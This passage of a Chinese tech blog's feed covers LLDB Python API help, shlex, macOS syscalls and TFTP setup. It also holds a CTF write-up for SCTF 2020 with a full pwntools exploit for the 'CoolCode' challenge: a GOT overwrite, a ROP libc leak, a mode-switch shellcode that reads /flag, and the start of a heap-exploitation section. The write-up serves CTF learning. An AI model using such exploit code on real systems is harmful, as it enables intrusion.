delete_SBFileSpec(…)</td></tr><tr><td>delete_SBFileSpec(SBFileSpec self)</td></tr><tr><td></td></tr><tr><td>----------------------------------------------------------------------</td></tr><tr><td>Data descriptors defined here:</td></tr><tr><td></td></tr><tr><td><strong>dict</strong></td></tr><tr><td>dictionary for instance variables (if defined)</td></tr><tr><td></td></tr><tr><td><strong>weakref</strong></td></tr><tr><td>list of weak references to the object (if defined)</td></tr><tr><td></td></tr><tr><td>basename</td></tr><tr><td>A read only property that returns the path basename as a python string.</td></tr><tr><td></td></tr><tr><td>dirname</td></tr><tr><td>A read only property that returns the path directory name as a python string.</td></tr><tr><td></td></tr><tr><td>exists</td></tr><tr><td>A read only property that returns a boolean value that indicates if the file exists.</td></tr><tr><td></td></tr><tr><td>fullpath</td></tr><tr><td>A read only property that returns the fullpath as a python string.</td></tr><tr><td></td></tr><tr><td>----------------------------------------------------------------------</td></tr><tr><td>Data and other attributes defined here:</td></tr><tr><td></td></tr><tr><td><strong>hash</strong> = None</td></tr><tr><td></td></tr><tr><td><strong>swig_getmethods</strong> = {‘basename’: <function sbfilespec.getfilename>, …</function></td></tr><tr><td></td></tr><tr><td><strong>swig_setmethods</strong> = {}</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### SBValueList Python Help</span><br></pre></td></tr></table></figure><p>class SBValueList(builtins.object)<br>|  SBValueList(*args)<br>|<br>|  Represents a collection of SBValues.  Both SBFrame’s GetVariables() and<br>|  GetRegisters() return a SBValueList.<br>|<br>|  SBValueList supports SBValue iteration. For example (from test/lldbutil.py),<br>|<br>|  def get_registers(frame, kind):<br>|      ‘’‘Returns the registers given the frame and the kind of registers desired.<br>|<br>|      Returns None if there’s no such kind.<br>|      ‘’’<br>|      registerSet = frame.GetRegisters() # Return type of SBValueList.<br>|      for value in registerSet:<br>|          if kind.lower() in value.GetName().lower():<br>|              return value<br>|<br>|      return None<br>|<br>|  def get_GPRs(frame):<br>|      ‘’‘Returns the general purpose registers of the frame as an SBValue.<br>|<br>|      The returned SBValue object is iterable.  An example:<br>|          …<br>|          from lldbutil import get_GPRs<br>|          regs = get_GPRs(frame)<br>|          for reg in regs:<br>|              print(’%s =&gt; %s’ % (reg.GetName(), reg.GetValue()))<br>|          …<br>|      ‘’’<br>|      return get_registers(frame, ‘general purpose’)<br>|<br>|  def get_FPRs(frame):<br>|      ‘’‘Returns the floating point registers of the frame as an SBValue.<br>|<br>|      The returned SBValue object is iterable.  An example:<br>|          …<br>|          from lldbutil import get_FPRs<br>|          regs = get_FPRs(frame)<br>|          for reg in regs:<br>|              print(’%s =&gt; %s’ % (reg.GetName(), reg.GetValue()))<br>|          …<br>|      ‘’’<br>|      return get_registers(frame, ‘floating point’)<br>|<br>|  def get_ESRs(frame):<br>|      ‘’‘Returns the exception state registers of the frame as an SBValue.<br>|<br>|      The returned SBValue object is iterable.  An example:<br>|          …<br>|          from lldbutil import get_ESRs<br>|          regs = get_ESRs(frame)<br>|          for reg in regs:<br>|              print(’%s =&gt; %s’ % (reg.GetName(), reg.GetValue()))<br>|          …<br>|      ‘’’<br>|      return get_registers(frame, ‘exception state’)<br>|<br>|  Methods defined here:<br>|<br>|  Append(self, *args)<br>|      Append(SBValueList self, SBValue val_obj)<br>|      Append(SBValueList self, SBValueList value_list)<br>|<br>|  Clear(self)<br>|      Clear(SBValueList self)<br>|<br>|  FindValueObjectByUID(self, uid)<br>|      FindValueObjectByUID(SBValueList self, lldb::user_id_t uid) -&gt; SBValue<br>|<br>|  GetFirstValueByName(self, name)<br>|      GetFirstValueByName(SBValueList self, str const * name) -&gt; SBValue<br>|<br>|  GetSize(self)<br>|      GetSize(SBValueList self) -&gt; uint32_t<br>|<br>|  GetValueAtIndex(self, idx)<br>|      GetValueAtIndex(SBValueList self, uint32_t idx) -&gt; SBValue<br>|<br>|  IsValid(self)<br>|      IsValid(SBValueList self) -&gt; bool<br>|<br>|  <strong>bool</strong> = <strong>nonzero</strong>(self)<br>|<br>|  <strong>del</strong> lambda self<br>|<br>|  <strong>getattr</strong> lambda self, name<br>|<br>|  <strong>getitem</strong>(self, key)<br>|<br>|  <strong>init</strong>(self, *args)<br>|      <strong>init</strong>(lldb::SBValueList self) -&gt; SBValueList<br>|      <strong>init</strong>(lldb::SBValueList self, SBValueList rhs) -&gt; SBValueList<br>|<br>|  <strong>iter</strong>(self)<br>|<br>|  <strong>len</strong>(self)<br>|<br>|  <strong>nonzero</strong>(self)<br>|<br>|  <strong>repr</strong> = _swig_repr(self)<br>|<br>|  <strong>setattr</strong> lambda self, name, value<br>|<br>|  <strong>str</strong>(self)<br>|      <strong>str</strong>(SBValueList self) -&gt; PyObject *</p><table><thead><tr><th></th></tr></thead><tbody><tr><td>Static methods defined here:</td></tr><tr><td></td></tr><tr><td><strong>swig_destroy</strong> = delete_SBValueList(…)</td></tr><tr><td>delete_SBValueList(SBValueList self)</td></tr><tr><td></td></tr><tr><td>----------------------------------------------------------------------</td></tr><tr><td>Data descriptors defined here:</td></tr><tr><td></td></tr><tr><td><strong>dict</strong></td></tr><tr><td>dictionary for instance variables (if defined)</td></tr><tr><td></td></tr><tr><td><strong>weakref</strong></td></tr><tr><td>list of weak references to the object (if defined)</td></tr><tr><td></td></tr><tr><td>----------------------------------------------------------------------</td></tr><tr><td>Data and other attributes defined here:</td></tr><tr><td></td></tr><tr><td><strong>swig_getmethods</strong> = {}</td></tr><tr><td></td></tr><tr><td><strong>swig_setmethods</strong> = {}</td></tr></tbody></table><pre><code></code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Python接口&quot;&gt;Python接口&lt;/h3&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td
      
    
    </summary>
    
    
      <category term="MacOS" scheme="http://yoursite.com/categories/MacOS/"/>
    
    
      <category term="MacOS" scheme="http://yoursite.com/tags/MacOS/"/>
    
      <category term="LLDB" scheme="http://yoursite.com/tags/LLDB/"/>
    
  </entry>
  
  <entry>
    <title>Python-shlex库</title>
    <link href="http://yoursite.com/2020/07/25/Python-shlex%E5%BA%93/"/>
    <id>http://yoursite.com/2020/07/25/Python-shlex%E5%BA%93/</id>
    <published>2020-07-25T05:36:02.000Z</published>
    <updated>2020-07-25T08:10:54.251Z</updated>
    
    <content type="html"><![CDATA[<h2 id="shlex库">shlex库</h2><h3 id="shlex常用来分割字符串，如下">shlex常用来分割字符串，如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; import shlex</span><br><span class="line">&gt;&gt; shlex.split(&quot;ls -all &#x2F;&quot;)</span><br><span class="line">[&#39;ls&#39;,&#39;-all&#39;,&#39;&#x2F;&#39;]</span><br></pre></td></tr></table></figure><h3 id="一般配合subprocess使用，如下">一般配合subprocess使用，如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import shlex,subprocess</span><br><span class="line">subprocess.popen(shlex.split(&quot;ls -all &#x2F;&quot;))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;shlex库&quot;&gt;shlex库&lt;/h2&gt;
&lt;h3 id=&quot;shlex常用来分割字符串，如下&quot;&gt;shlex常用来分割字符串，如下&lt;/h3&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;p
      
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>研究-MacOS程序分析</title>
    <link href="http://yoursite.com/2020/07/18/%E7%A0%94%E7%A9%B6-MacOS%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/07/18/%E7%A0%94%E7%A9%B6-MacOS%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/</id>
    <published>2020-07-18T08:14:45.374Z</published>
    <updated>2020-07-18T08:14:47.697Z</updated>
    
    <content type="html"><![CDATA[<p>MacOS程序分析<br>使用系统调用和使用系统库函数类似，但是，系统库函数我们可以利用函数名进行调用，如_exit, _printf等。但是，我们使用系统调用，则只能利用系统调用号进行调用。这里还有一点需要注意的，就是之前在操作系统基础中提到过，macOS的内核XNU是分为BSD层和Mach层。我们常用的系统调用都属于BSD的系统调用。而BSD层在逻辑地址上是位于Mach层之上的，BSD层要从0x2000000开始。因此，我们实际使用的调用号应该是syscall.h给出的调用号加上0x2000000之后的结果，如SYS_exit的调用号就应当是0x2000001.</p><p>在汇编语言中，系统调用号应赋给rax寄存器，然后接下来系统调用的参数按照之前讲的调用约定，依次传给rdi, rsi等寄存器中。最后，使用syscall即可。</p><p>比如说，我们在程序中调用SYS_exit系统调用：</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;MacOS程序分析&lt;br&gt;
使用系统调用和使用系统库函数类似，但是，系统库函数我们可以利用函数名进行调用，如_exit, _printf等。但是，我们使用系统调用，则只能利用系统调用号进行调用。这里还有一点需要注意的，就是之前在操作系统基础中提到过，macOS的内核XNU是
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>MacOS开启TFTP功能</title>
    <link href="http://yoursite.com/2020/07/10/MacOS%E5%BC%80%E5%90%AFTFTP/"/>
    <id>http://yoursite.com/2020/07/10/MacOS%E5%BC%80%E5%90%AFTFTP/</id>
    <published>2020-07-10T01:27:02.000Z</published>
    <updated>2020-07-20T03:44:45.498Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MacOS开启TFTP功能">MacOS开启TFTP功能</h2><h3 id="打开「终端」，执行以下命令（需要管理员密码）：">打开「终端」，执行以下命令（需要管理员密码）：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo launchctl load -w &#x2F;System&#x2F;Library&#x2F;LaunchDaemons&#x2F;tftp.plist</span><br><span class="line"></span><br><span class="line">sudo launchctl start com.apple.tftpd</span><br></pre></td></tr></table></figure><h2 id="放置文件">放置文件</h2><figure class="highlight plain"><figcaption><span>``` 为 TFTP 服务器的根目录，请将需要使用的文件放置在该目录下（需要管理员密码）</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 关闭 TFTP 服务</span><br></pre></td></tr></table></figure><p>sudo launchctl unload -F /System/Library/LaunchDaemons/tftp.plist<br>sudo launchctl stop com.apple.tftpd</p><pre><code></code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;MacOS开启TFTP功能&quot;&gt;MacOS开启TFTP功能&lt;/h2&gt;
&lt;h3 id=&quot;打开「终端」，执行以下命令（需要管理员密码）：&quot;&gt;打开「终端」，执行以下命令（需要管理员密码）：&lt;/h3&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;tab
      
    
    </summary>
    
    
      <category term="MacOS" scheme="http://yoursite.com/categories/MacOS/"/>
    
    
      <category term="MacOS" scheme="http://yoursite.com/tags/MacOS/"/>
    
  </entry>
  
  <entry>
    <title>CTF-XCTF-2020-SCTF</title>
    <link href="http://yoursite.com/2020/07/06/CTF-XCTF-2020-SCTF/"/>
    <id>http://yoursite.com/2020/07/06/CTF-XCTF-2020-SCTF/</id>
    <published>2020-07-06T01:07:02.000Z</published>
    <updated>2020-07-06T01:56:07.710Z</updated>
    
    <content type="html"><![CDATA[<h1>PWN</h1><h2 id="CoolCode">CoolCode</h2><h3 id="由于add的时候存在负整数溢出，可以直接覆盖exit-got为heap地址，且heap区段是可读可写可执行，所以输入-xc3，也就是ret汇编的机器码，就可以绕过exit">由于add的时候存在负整数溢出，可以直接覆盖exit_got为heap地址，且heap区段是可读可写可执行，所以输入<code>\xc3</code>，也就是ret汇编的机器码，就可以绕过exit</h3><h3 id="然后覆盖scanf-got为heap区段，然后到heap中执行shellcode，首先执行read-0-“rsp”-0x100-ret-这样可以构造栈溢出，所以从堆题转化为栈题">然后覆盖scanf_got为heap区段，然后到heap中执行shellcode，首先执行read(0,“rsp”,0x100);ret;这样可以构造栈溢出，所以从堆题转化为栈题</h3><h3 id="然后跑ROP去泄露libc地址，然后回到scanf-plt，回到堆上的shellcode，继续栈溢出劫持执行mmap，然后再mmap上构造retfq和retf，切换到x86执行SYS-open，然后切换回x64执行read、write，最后拿到flag">然后跑ROP去泄露libc地址，然后回到scanf_plt，回到堆上的shellcode，继续栈溢出劫持执行mmap，然后再mmap上构造retfq和retf，切换到x86执行SYS_open，然后切换回x64执行read、write，最后拿到flag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># Author xynm</span><br><span class="line">#import xynm_pwn_util</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">from time import *</span><br><span class="line">from pwn import *</span><br><span class="line">#log_level[&#39;CRITICAL&#39;, &#39;DEBUG&#39;, &#39;ERROR&#39;, &#39;INFO&#39;, &#39;NOTSET&#39;, &#39;WARN&#39;, &#39;WARNING&#39;]</span><br><span class="line">context.log_level &#x3D; b&quot;CRITICAL&quot;</span><br><span class="line">remote_ip        &#x3D; b&#39;127.0.0.1&#39;</span><br><span class="line">remote_port      &#x3D; 9999</span><br><span class="line">binary_file      &#x3D; &#39;.&#x2F;%s&#39; % &quot;CoolCode&quot;</span><br><span class="line">#context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</span><br><span class="line">local_libc_file  &#x3D; b&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;</span><br><span class="line">remote_libc_file &#x3D; b&#39;&#39;</span><br><span class="line">def exploit(sh,remote &#x3D; False,awd &#x3D; False,awd_binary_file &#x3D; &#39;&#39;):</span><br><span class="line">        def debug(gdb_script &#x3D; &quot;&quot;):</span><br><span class="line">                gdb.attach(sh,gdb_script)</span><br><span class="line">        global binary_file,local_libc_file,remote_ip,remote_port,local_libc_file,remote_libc_file</span><br><span class="line">        elf &#x3D; ELF(binary_file)</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">        if (awd or remote) and remote_libc_file !&#x3D; &quot;&quot;:</span><br><span class="line">                lib &#x3D; ELF(remote_libc_file)</span><br><span class="line">        else:</span><br><span class="line">                lib &#x3D; elf.libc if local_libc_file &#x3D;&#x3D; b&quot;&quot; else ELF(local_libc_file)</span><br><span class="line">        pop_rdi_ret &#x3D; elf.search(asm(b&quot;pop rdi ; ret&quot;)).next()</span><br><span class="line">        pop_rsi_r15_ret &#x3D; elf.search(asm(b&quot;pop rsi ; pop r15 ; ret&quot;)).next()</span><br><span class="line">        s       &#x3D; lambda data               :sh.send(str(data))</span><br><span class="line">        sa      &#x3D; lambda delim,data         :sh.sendafter(str(delim), str(data))</span><br><span class="line">        sl      &#x3D; lambda data               :sh.sendline(str(data))</span><br><span class="line">        sla     &#x3D; lambda delim,data         :sh.sendlineafter(str(delim), str(data))</span><br><span class="line">        r       &#x3D; lambda numb&#x3D;4096          :sh.recv(numb)</span><br><span class="line">        ru      &#x3D; lambda delims, drop&#x3D;True  :sh.recvuntil(delims, drop)</span><br><span class="line">        irt     &#x3D; lambda                    :sh.interactive()</span><br><span class="line">        uu32    &#x3D; lambda data               :u32(data.ljust(4, b&#39;\x00&#39;))</span><br><span class="line">        uu64    &#x3D; lambda data               :u64(data.ljust(8, b&#39;\x00&#39;))</span><br><span class="line">        ru7f    &#x3D; lambda                    :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))</span><br><span class="line">        ruf7    &#x3D; lambda                    :u32(sh.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,b&#39;\x00&#39;))</span><br><span class="line">        lg      &#x3D; lambda data               :log.success(data)</span><br><span class="line"> &#39;&#39;&#39;</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number</span><br><span class="line"> 0001: 0x15 0x04 0x00 0x00000001  if (A &#x3D;&#x3D; write) goto 0006</span><br><span class="line"> 0002: 0x15 0x03 0x00 0x00000000  if (A &#x3D;&#x3D; read) goto 0006</span><br><span class="line"> 0003: 0x15 0x02 0x00 0x00000009  if (A &#x3D;&#x3D; mmap) goto 0006</span><br><span class="line"> 0004: 0x15 0x01 0x00 0x00000005  if (A &#x3D;&#x3D; fstat) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x00050005  return ERRNO(5)</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> &#39;&#39;&#39;</span><br><span class="line"> #puts_got   : 0x602028</span><br><span class="line">#chunk_list : 0x602140</span><br><span class="line">def add(idx,content):</span><br><span class="line"> sla(&quot;Your choice :&quot;,&quot;1&quot;)</span><br><span class="line">sla(&quot;:&quot;,str(idx))</span><br><span class="line">sa(&quot;messages: &quot;,content)</span><br><span class="line">def show(idx):</span><br><span class="line">sla(&quot;Your choice :&quot;,&quot;2&quot;)</span><br><span class="line">sla(&quot;:&quot;,str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">sla(&quot;Your choice :&quot;,&#39;3&#39;)</span><br><span class="line">sla(&quot;:&quot;,str(idx))</span><br><span class="line"></span><br><span class="line">exit_offset &#x3D; -(0x602140 - 0x602090) &#x2F; 0x8</span><br><span class="line">read_offset &#x3D; -(0x602140 - 0x602058) &#x2F; 0x8</span><br><span class="line">scanf_offset &#x3D; -(0x602140 - 0x602088) &#x2F; 0x8</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;\xc3&#39;</span><br><span class="line">add(exit_offset,payload)</span><br><span class="line">payload &#x3D; shellcraft.read(0,&quot;rsp&quot;,0x100)</span><br><span class="line">payload +&#x3D; &quot;ret;&quot;</span><br><span class="line">payload &#x3D; asm(payload)</span><br><span class="line"></span><br><span class="line">add(scanf_offset,payload)</span><br><span class="line">sla(&quot;Your choice :&quot;,&quot;1&quot;)</span><br><span class="line">payload &#x3D;  p64(pop_rdi_ret)</span><br><span class="line"> payload +&#x3D; p64(elf.got[&#39;__libc_start_main&#39;])</span><br><span class="line">payload +&#x3D; p64(elf.plt[&#39;puts&#39;])</span><br><span class="line">payload +&#x3D; p64(elf.plt[&#39;__isoc99_scanf&#39;])</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">sleep(1)</span><br><span class="line">__libc_start_main &#x3D; ru7f()</span><br><span class="line">libc &#x3D; __libc_start_main - lib.symbols[b&#39;__libc_start_main&#39;]</span><br><span class="line">#debug_remote(sh.pid)</span><br><span class="line"></span><br><span class="line">lib.address &#x3D; libc</span><br><span class="line">system &#x3D; lib.symbols[b&#39;system&#39;]</span><br><span class="line">binsh &#x3D; lib.search(b&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">__free_hook &#x3D; lib.symbols[b&#39;__free_hook&#39;]</span><br><span class="line">__malloc_hook &#x3D; lib.symbols[b&#39;__malloc_hook&#39;]</span><br><span class="line">__realloc_hook &#x3D; lib.symbols[b&#39;__realloc_hook&#39;]</span><br><span class="line">one_gadget &#x3D; []</span><br><span class="line"></span><br><span class="line">#0x0000000000048a8f : shr r9, cl ; mov qword ptr [rdi], r9 ; ret</span><br><span class="line"></span><br><span class="line">pop_rdi_ret &#x3D; 0x0000000000021102</span><br><span class="line">pop_rsi_ret &#x3D; 0x00000000000202e8</span><br><span class="line">pop_rdx_ret &#x3D; 0x0000000000001b92</span><br><span class="line">pop_rcx_rbx_ret &#x3D; 0x00000000000ea69a</span><br><span class="line">pop_rax_ret &#x3D; 0x0000000000033544</span><br><span class="line">pop_r8_ret &#x3D; 0x0000000000135136</span><br><span class="line">shr_r9_cl_mov_ptr_rdi_r9_ret &#x3D; 0x0000000000048a8f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">payload +&#x3D; p64(libc+pop_rsi_ret) + p64(0x1000)</span><br><span class="line">payload +&#x3D; p64(libc+pop_rdx_ret) + p64(0x7)</span><br><span class="line">payload +&#x3D; p64(libc+pop_rcx_rbx_ret) + p64(34) + p64(0)</span><br><span class="line">payload +&#x3D; p64(libc+pop_r8_ret) + p64(0)</span><br><span class="line"></span><br><span class="line">payload +&#x3D; p64(libc+pop_rdi_ret) + p64(elf.bss() + 0x300)</span><br><span class="line">payload +&#x3D; p64(libc+shr_r9_cl_mov_ptr_rdi_r9_ret)</span><br><span class="line">payload +&#x3D; p64(libc+pop_rdi_ret) + p64(0x66666000)</span><br><span class="line">payload +&#x3D; p64(lib.sym[&#39;mmap&#39;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload +&#x3D; p64(libc+pop_rdi_ret) + p64(0)</span><br><span class="line">payload +&#x3D; p64(libc+pop_rsi_ret) + p64(0x66666000)</span><br><span class="line">payload +&#x3D; p64(libc+pop_rdx_ret) + p64(0x1000)</span><br><span class="line">payload +&#x3D; p64(lib.sym[&#39;read&#39;])</span><br><span class="line">payload +&#x3D; p64(0x66666000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">sleep(1)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;&#39;</span><br><span class="line">payload +&#x3D; asm(&quot;mov rsp,0x66666300&quot;)</span><br><span class="line">payload +&#x3D; asm(&quot;push 0x23&quot;)</span><br><span class="line">payload +&#x3D; asm(&quot;push 0x66666100&quot;)</span><br><span class="line"></span><br><span class="line">payload +&#x3D; asm(&quot;retfq&quot;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; payload.ljust(0x100,&#39;\x90&#39;)</span><br><span class="line">payload +&#x3D; &#39;jgh&#x2F;fla\x89\xe31\xc91\xd2j\x05X\xcd\x80&#39; #open(&quot;&#x2F;flag&quot;,0)</span><br><span class="line">payload +&#x3D; &#39;j3hPaff\xcb&#39;#push 0x33;push 0x66666614</span><br><span class="line">payload &#x3D; payload.ljust(0x150,&#39;\x90&#39;)</span><br><span class="line">payload +&#x3D; asm(shellcraft.read(3,0x66666800,0x100))</span><br><span class="line">payload +&#x3D; asm(shellcraft.write(1,0x66666800,0x100))</span><br><span class="line"></span><br><span class="line">payload &#x3D; payload.ljust(0x300,&#39;\x90&#39;)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lg(b&quot;libc: &quot; + hex(lib.address))</span><br><span class="line">lg(b&quot;system: &quot; + hex(system))</span><br><span class="line">lg(b&quot;binsh: &quot; + hex(binsh))</span><br><span class="line">lg(b&quot;__free_hook: &quot; + hex(__free_hook))</span><br><span class="line">lg(b&quot;__realloc_hook: &quot; + hex(__realloc_hook))</span><br><span class="line">lg(b&quot;__malloc_hook: &quot; + hex(__malloc_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">irt()</span><br><span class="line"></span><br><span class="line">def CTF_exploit(argv):</span><br><span class="line">        global remote_ip,remote_port,binary_file</span><br><span class="line">        argv_len &#x3D; len(argv)</span><br><span class="line">        context.log_level &#x3D; b&quot;DEBUG&quot;</span><br><span class="line">        if argv_len &#x3D;&#x3D; 1:</span><br><span class="line">                sh &#x3D; process(binary_file)</span><br><span class="line">                exploit(sh)</span><br><span class="line">                return</span><br><span class="line">        elif argv_len &#x3D;&#x3D; 3:</span><br><span class="line">                sh &#x3D; remote(argv[1],argv[2])</span><br><span class="line">                exploit(sh,remote &#x3D; True)</span><br><span class="line">                return</span><br><span class="line">        else:</span><br><span class="line">                sh &#x3D; process(binary_file)</span><br><span class="line">                exploit(sh)</span><br><span class="line">if __name__ &#x3D;&#x3D; b&quot;__main__&quot;:</span><br><span class="line">        CTF_exploit(sys.argv)</span><br></pre></td></tr></table></figure><h2 id="snake">snake</h2><h3 id="按按回车，等蛇撞墙了，输入很长的数据，然后add、free一下，诶，崩了？">按按回车，等蛇撞墙了，输入很长的数据，然后add、free一下，诶，崩了？</h3><h3 id="仔细一看，heap中有一个off-by-one，那么可以实现heap-overlap，通过布局可以实现fastbin-attack，由于我太懒了，而且刚好可以打到read，然后恰好有一个one-gadget离read非常近，所以覆盖read低两个字节为one-gadget低位直接爆破拿到shell">仔细一看，heap中有一个off by one，那么可以实现heap overlap，通过布局可以实现fastbin attack，由于我太懒了，而且刚好可以打到read，然后恰好有一个one_gadget离read非常近，所以覆盖read低两个字节为one_gadget低位直接爆破拿到shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 